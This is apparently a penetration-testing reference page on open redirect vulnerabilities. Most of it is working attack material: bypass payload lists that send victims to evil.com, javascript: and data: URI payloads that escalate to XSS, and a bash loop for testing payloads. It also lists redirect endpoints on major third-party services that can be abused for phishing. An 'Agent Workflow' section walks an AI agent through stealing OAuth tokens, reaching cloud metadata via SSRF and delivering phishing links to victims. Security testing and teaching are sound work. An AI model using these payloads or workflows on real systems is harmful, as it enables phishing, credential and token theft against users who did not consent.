# Open Redirect

> **Summary**: The application redirects users to an attacker-controlled URL via unvalidated user input in redirect parameters, enabling phishing, token theft, and chained attacks.
> **Impact**: Phishing credential theft, OAuth token interception, SSRF pivoting, and XSS via javascript: URIs.
> **Typical Severity**: Low | Medium (escalates to High when chained with OAuth or SSRF)

## Detection

### Indicators

Common redirect parameter names to look for in URLs:

```
url=, redirect=, next=, dest=, destination=, redir=, redirect_uri=,
redirect_url=, return=, returnTo=, return_to=, return_path=, go=,
forward=, forward_url=, out=, view=, target=, rurl=, callback=,
callback_url=, continue=, checkout_url=, image_url=, to=, link=,
location=, u=, uri=, q=, src=, data=, login=, logout=, ext=,
clickurl=, goto=, jump=, jump_url=, origin=, originUrl=, desturl=,
page=, action=, action_url=, sp_url=, service=, recurl=, backurl=,
RedirectUrl=, ReturnUrl=, success=, burl=, request=
```

### Automated Detection

```bash
# Gather historical URLs and filter for redirect parameters
cat domains.txt | gau --o urls.txt
rg -NI "(url=|next=|redir=|redirect|dest=|rurl=|return=|continue=|goto=|forward=)" urls.txt | sort -u > candidates.txt

# Fuzz with OpenRedireX
cat candidates.txt | openredirex -p payloads.txt -k FUZZ -c 50 > results.txt

# Check results for 30x redirects
awk '/30[1237]|Location:/I' results.txt
```

### Manual Detection

```bash
# Quick check if a parameter redirects externally
curl -s -I "https://target.com/redirect?url=https://evil.com" | grep -i "^Location:"
curl -s -I "https://target.com/login?next=//evil.com" | grep -i "^Location:"

# Check for client-side redirects (meta refresh, JS redirect)
curl -s "https://target.com/redirect?url=https://evil.com" | grep -iE "(location\s*=|window\.location|meta.*refresh|replace\()"
```

Also look for client-side redirect sinks in SPAs: `window.location`, `location.assign()`, `location.replace()`, and framework helpers that read query/hash and redirect.

## Exploitation

### Prerequisites

- A redirect parameter that accepts user-controlled input.
- The application does not properly validate the redirect destination against a strict allowlist.

### Step-by-Step

1. Identify a redirect parameter (check URL params, POST body, Referer header).
2. Set the parameter value to an external domain and observe if the redirect occurs.
3. If blocked, apply bypass payloads from the list below (encoding, protocol-relative, etc.).
4. Validate the redirect by checking the `Location` header or observing browser navigation.
5. Escalate: use the redirect in an OAuth flow to steal tokens, or chain with SSRF/XSS.

### Payloads

#### Basic Redirect Payloads

```
https://evil.com
http://evil.com
//evil.com
```

#### Protocol-Relative Bypass

Using `//` to bypass `http` blacklisted keyword:

```
//evil.com
///evil.com
////evil.com
```

#### Using "https:" to Bypass "//" Blacklist

```
https:evil.com
```

#### Backslash Tricks

Using `/\/` to bypass `//` blacklisted keyword:

```
\/\/evil.com/
/\/evil.com/
/\evil.com
```

#### @ Userinfo Trick

Browser redirects to anything after the `@`:

```
http://trusted.com@evil.com/
https://trusted.com@evil.com/
http://trusted.com%40evil.com
```

#### Backslash Parsing Confusion

Some backends treat `\` as a path char; browsers normalize to `/` and interpret the host as userinfo:

```
https://trusted.com\@evil.com/
```

#### URL Encoding Bypasses

```
https://evil%2Ecom
https://evil%00.com
https://evil.com%00trusted.com
https://evil.com%0d%0atrusted.com
```

#### Double Encoding

```
https://evil%252Ecom
%2568ttps://evil.com
```

#### Unicode Character Bypass

Using `%E3%80%82` to bypass `.` blacklisted character (fullwidth dot):

```
//evil%E3%80%82com
```

#### Null Byte Injection

```
//evil%00.com
https://evil.com%00@trusted.com
```

#### Tab and Newline Injection

```
//evil%09.com
//evil%0a.com
//evil%0d.com
java%0d%0ascript:alert(1)
```

#### Parameter Pollution

```
?next=trusted.com&next=evil.com
```

#### Hostname/Domain Tricks

```
# Subdomain matching bypass
https://trusted.com.evil.com
https://evil.com/trusted.com
https://trustedcom.evil.com

# Trailing dot
https://evil.com.

# IPv4/IPv6 alternatives (for localhost allowlist bypass)
http://127.0.0.1
http://127.1
http://2130706433
http://0x7f000001
http://[::1]
http://[::ffff:127.0.0.1]

# Wildcard DNS resolving to loopback
http://127.0.0.1.sslip.io
http://lvh.me
http://localtest.me
```

#### Fragment and Data URI Tricks

```
# Fragment-based
https://trusted.com#@evil.com
//trusted.com#%0a//evil.com

# Data URI (client-side redirects)
data:text/html,<script>location='https://evil.com'</script>
data:text/html;base64,PHNjcmlwdD5sb2NhdGlvbj0naHR0cHM6Ly9ldmlsLmNvbSc8L3NjcmlwdD4=
```

#### javascript: URI (Escalate to XSS)

```
javascript:alert(1)
java%0d%0ascript%0d%0a:alert(0)
javascript://trusted.com/%0Aalert(1)
javascript://%250Aalert(1)
javascript://%250Aalert(1)//?1
javascript://%250A1?alert(1):0
%09Jav%09ascript:alert(document.domain)
//%5cjavascript:alert(1);
\j\av\a\s\cr\i\pt\:\a\l\ert\(1\)
jaVAscript://trusted.com//%0d%0aalert(1);//
javascript://trusted.com?%a0alert%281%29
/x:1/:///%01javascript:alert(document.cookie)/
```

#### SVG-Based Open Redirect

```xml
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<svg onload="window.location='https://evil.com'" xmlns="http://www.w3.org/2000/svg">
</svg>
```

### Proof of Concept

```bash
# Verify an open redirect
curl -s -I "https://target.com/login?next=//evil.com" | grep -i location

# Test multiple bypass payloads
TARGET="https://target.com/redirect?url="
PAYLOADS=("//evil.com" "https://evil.com" "https://trusted.com@evil.com" "/\\evil.com" "//evil%E3%80%82com" "//evil%00.com" "https:evil.com" "\\/\\/evil.com")
for p in "${PAYLOADS[@]}"; do
    LOC=$(curl -s -I "${TARGET}${p}" | grep -i "^location:" | head -1)
    echo "$LOC  <-- $p"
done
```

## Bypasses

- When the app checks for the trusted domain as a substring, use `trusted.com.evil.com` or `evil.com/trusted.com`.
- When `//` is blocked, use `\/\/`, `/\`, `https:`, or `%2f%2f`.
- When `.` is blocked, use `%E3%80%82` (fullwidth ideographic dot) or `%2e`.
- When the scheme is enforced, use protocol-relative `//evil.com`.
- When only paths are accepted, use `/\evil.com` or `/..//evil.com`.
- When URL parsing differs between validator and redirect handler, use backslash confusion or encoded characters.
- Fragment smuggling + client-side traversal chains (see Grafana-style bypass: validator checks `URL.Path`, ignores `URL.Fragment`).

## Escalation

- **OAuth token theft**: Use the open redirect as the `redirect_uri` in an OAuth flow to steal authorization codes or tokens. See [OAuth](../authentication/oauth.md).
- **SSRF pivot**: If the redirect parameter is also fetched server-side, chain with [SSRF](ssrf.md) for internal access.
- **Phishing**: Use the trusted domain URL as a convincing phishing link that redirects to a cloned login page.
- **XSS**: Escalate via `javascript:` URI payloads when the redirect value is placed in `location`, `window.location`, or `<meta>` refresh.
- **CSRF bypass**: Open redirects can defeat Referer-based CSRF protections.
- **Cache poisoning**: Chain with web cache poisoning to serve malicious redirects to other users.

## Open Redirect Farming

1. Register a user and log in.
2. Navigate to a protected page (e.g., `/accounts/profile`).
3. Copy the profile URL.
4. Log out, clear cookies, and paste the profile URL.
5. The login page may appear with a redirect parameter (e.g., `/login?next=accounts/profile`).
6. Replace the redirect value with an external URL and test.

## Known Open Redirects (Third-Party Services)

These are known redirect endpoints on popular services that can be abused for phishing:

```
https://google.com/amp/s/evil.com
https://meet.google.com/linkredirect?dest=http://evil.com
https://www.google.com/search?btnI&q=http://evil.com
https://www.facebook.com/l.php?u=http://evil.com
https://www.youtube.com/redirect?q=http://evil.com
https://docs.google.com/gview?url=https://evil.com
```

## Tools

| Tool | Usage |
|---|---|
| [OpenRedireX](https://github.com/devanshbatham/OpenRedireX) | `cat urls.txt \| openredirex -p payloads.txt -k FUZZ -c 50` |
| [Oralyzer](https://github.com/r0075h3ll/Oralyzer) | `python3 oralyzer.py -u "https://target.com/redirect?url=FUZZ"` |
| [gau](https://github.com/lc/gau) | `echo target.com \| gau` (gather URLs with redirect params) |
| [waybackurls](https://github.com/tomnomnom/waybackurls) | `echo target.com \| waybackurls` (historical URL discovery) |
| [Burp Suite](https://portswigger.net) | Match & replace rules, Intruder for param fuzzing |

## Agent Workflow
> Step-by-step instructions for an AI agent to test for this vulnerability.

### Phase 1: Discovery
1. Crawl `<TARGET>` and gather all URLs using historical data: `echo <TARGET_DOMAIN> | gau --o urls.txt`
2. Filter for redirect parameters:
   ```bash
   rg -NI "(url=|next=|redir=|redirect=|dest=|return=|continue=|goto=|forward=|callback=|redirect_uri=|returnTo=)" urls.txt | sort -u > candidates.txt
   ```
3. Check login/logout flows: log out, visit a protected page, and observe if a redirect parameter appears in the login URL (e.g., `/login?next=/dashboard`)
4. Inspect JavaScript files for client-side redirect sinks: `window.location`, `location.assign()`, `location.replace()`, `location.href =`
5. Check POST body parameters and HTTP headers (e.g., `Referer`, `Host`) for redirect behavior
6. Look for redirect endpoints in API documentation or sitemap

### Phase 2: Validation
1. Test basic redirect: set the parameter to `https://evil.com` and check the `Location` response header or browser navigation
   ```bash
   curl -s -I "https://<TARGET>/<REDIRECT_ENDPOINT>?<PARAM>=https://evil.com" | grep -i "^location:"
   ```
2. If basic redirect is blocked, test bypass payloads in order:
   - Protocol-relative: `//evil.com`
   - Backslash trick: `/\/evil.com`, `\/\/evil.com`
   - @ userinfo trick: `https://<TARGET_DOMAIN>@evil.com`
   - URL encoding: `https://evil%2Ecom`
   - Double encoding: `https://evil%252Ecom`
   - Unicode dot: `//evil%E3%80%82com`
   - Null byte: `//evil%00.com`
   - Domain confusion: `https://<TARGET_DOMAIN>.evil.com`, `https://evil.com/<TARGET_DOMAIN>`
3. Automate bypass testing: `cat candidates.txt | openredirex -p payloads.txt -k FUZZ -c 50`
4. For client-side redirects, test `javascript:alert(document.domain)` to check for XSS escalation

### Phase 3: Exploitation
1. **Phishing**: Craft a convincing URL using the trusted domain that redirects to a cloned login page:
   ```
   https://<TARGET>/<REDIRECT_ENDPOINT>?<PARAM>=https://<ATTACKER_PHISHING_PAGE>
   ```
2. **OAuth token theft**: If `<TARGET>` has an OAuth flow, use the open redirect as the `redirect_uri` to intercept authorization codes:
   ```
   https://<TARGET>/oauth/authorize?client_id=<CLIENT_ID>&redirect_uri=https://<TARGET>/<REDIRECT_ENDPOINT>?<PARAM>=https://<ATTACKER>&response_type=code
   ```
3. **XSS via javascript: URI**: If the redirect parameter is used in `location.href` or `window.location` without scheme validation:
   ```
   https://<TARGET>/<REDIRECT_ENDPOINT>?<PARAM>=javascript:alert(document.domain)
   ```
4. Host the exploit URL and deliver to the victim via social engineering

### Phase 4: Escalation
1. Chain with [OAuth](../authentication/oauth.md): use open redirect as `redirect_uri` to steal OAuth authorization codes or tokens
2. Chain with [SSRF](ssrf.md): if the redirect parameter is fetched server-side, redirect to internal addresses (`http://169.254.169.254/latest/meta-data/`)
3. Chain with [CSRF](csrf.md): use open redirect to bypass Referer-based CSRF protection
4. Chain with [XSS](xss.md): escalate to XSS via `javascript:` URI payloads
5. Chain with [Cache Poisoning](cache-poisoning.md): poison cached responses to redirect all users to attacker's page

## Decision Tree

```
Identify redirect parameter (<PARAM>)
├── Set <PARAM>=https://evil.com
│   ├── Redirect occurs → Open redirect confirmed
│   └── Blocked
│       ├── Try //evil.com (protocol-relative)
│       │   └── Blocked → Try /\/evil.com or \/\/evil.com
│       ├── Try https://<TARGET>@evil.com (userinfo trick)
│       ├── Try https://evil%2Ecom (URL encoding)
│       ├── Try https://<TARGET>.evil.com (domain confusion)
│       ├── Try //evil%E3%80%82com (Unicode dot)
│       ├── Try double encoding (%252E, %2568)
│       └── Try parameter pollution (?<PARAM>=trusted.com&<PARAM>=evil.com)
├── Client-side redirect (JS-based)?
│   ├── Try javascript:alert(1) → XSS?
│   └── Try data:text/html,<script>location='https://evil.com'</script>
└── No redirect behavior → Not vulnerable
```

## Success Criteria
- The browser redirects from `<TARGET>` (trusted domain) to an attacker-controlled domain (`<ATTACKER>`)
- The full URL starts with the trusted domain, making it convincing for phishing
- For OAuth escalation: the authorization code or token is delivered to the attacker's server via the redirect chain

---

## References

- [HackTricks - Open Redirect](https://book.hacktricks.wiki/en/pentesting-web/open-redirect.html)
- [PayloadsAllTheThings - Open Redirect](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Open%20Redirect)
- [Open Redirect Cheat Sheet - pentester.land](https://pentester.land/cheatsheets/2018/11/02/open-redirect-cheatsheet.html)
- [Open Redirect Payloads - cujanovic](https://github.com/cujanovic/Open-Redirect-Payloads)
- [PortSwigger - DOM-based Open Redirection](https://portswigger.net/web-security/dom-based/open-redirection)
- [Grafana CVE-2025-6023 Redirect + Traversal Bypass Chain](https://blog.ethiack.com/blog/grafana-cve-2025-6023-bypass-a-technical-deep-dive)
